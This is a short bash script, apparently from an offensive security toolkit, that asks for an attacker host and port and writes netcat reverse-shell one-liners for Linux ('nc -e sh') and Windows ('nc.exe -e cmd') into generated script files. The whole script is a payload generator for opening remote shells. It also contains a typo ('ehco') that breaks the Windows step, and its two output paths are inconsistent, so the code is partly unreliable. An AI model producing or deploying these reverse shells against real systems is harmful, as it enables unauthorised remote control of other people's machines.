#!/bin/bash

read -p "[+] Enter LHOST : " LHOST
read -p "[+] Enter LPORT : " LPORT

echo "LHOST : $LHOST"
echo "LPORT : $LPORT"

echo """
nc -e sh $LHOST $LPORT
""" >> ../wd-generated/ncatshelllinux.sh
ehco """
nc.exe -e cmd $LHOST $LPORT
""" >> /opt/wd-generated/ncatshellwindows.sh